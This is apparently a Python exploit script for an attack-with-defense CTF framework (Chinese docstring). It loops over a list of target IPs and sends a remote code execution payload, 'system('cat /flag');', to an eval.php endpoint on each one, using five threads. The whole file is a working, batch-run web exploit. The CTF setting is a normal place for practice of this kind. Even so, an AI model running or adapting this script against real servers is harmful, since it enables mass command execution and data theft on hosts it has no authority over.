from awdframework.awd import Attack,AwdTask
import requests
from os.path import dirname

class Exp(AwdTask):
    """
    自定义一个Exp类，继承自AwdTask。覆写的 exp() 会被运行在每个 ip 上
    """
    def __init__(self, ips, port=80):
        super().__init__(ips, port)

    def exp(self, ip):
        url = f"http://{ip}:{self.port}/eval.php"
        resp = requests.get(url,params={"code":"system('cat /flag');"})
        print(resp.text)

attacker = Attack(f"{dirname(__file__)}/../../ip.txt",Exp,port=80,thread_num=5)
attacker.attack()